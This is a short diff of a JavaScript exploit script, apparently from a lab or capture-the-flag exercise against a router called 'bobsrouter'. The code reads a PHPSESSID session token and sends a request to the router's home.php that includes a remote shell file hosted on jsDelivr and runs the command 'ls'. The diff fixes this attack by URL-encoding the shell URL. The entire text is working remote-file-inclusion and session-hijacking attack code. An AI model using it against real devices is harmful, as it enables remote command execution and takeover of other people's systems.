@@ -18,7 +18,6 @@ let xhr = new XMLHttpRequest();
 
 xhr.onreadystatechange = function() {
 	if (xhr.readyState === 4) {
-		// TODO: extract PHPSESSID from query params using URLSearchParams, then make a get to http://router.local/home.php?action=configure&PHPSESSID=...
 		forwardResponse(xhr);
 
 		const queryString = xhr.responseURL.split('?')[1];
@@ -35,7 +34,7 @@ xhr.onreadystatechange = function() {
 
 		const SHELL = "https://cdn.jsdelivr.net/gh/dspencer12/bobsrouter@0.23/shell";
 
-		xhr2.open("GET", ROUTER + "/home.php?action=" + SHELL + "&x=ls&PHPSESSID=" + sessionId, true);
+		xhr2.open("GET", ROUTER + "/home.php?action=" + encodeURIComponent(SHELL) + "&x=ls&PHPSESSID=" + sessionId, true);
 		xhr2.send('');
 	}
 }
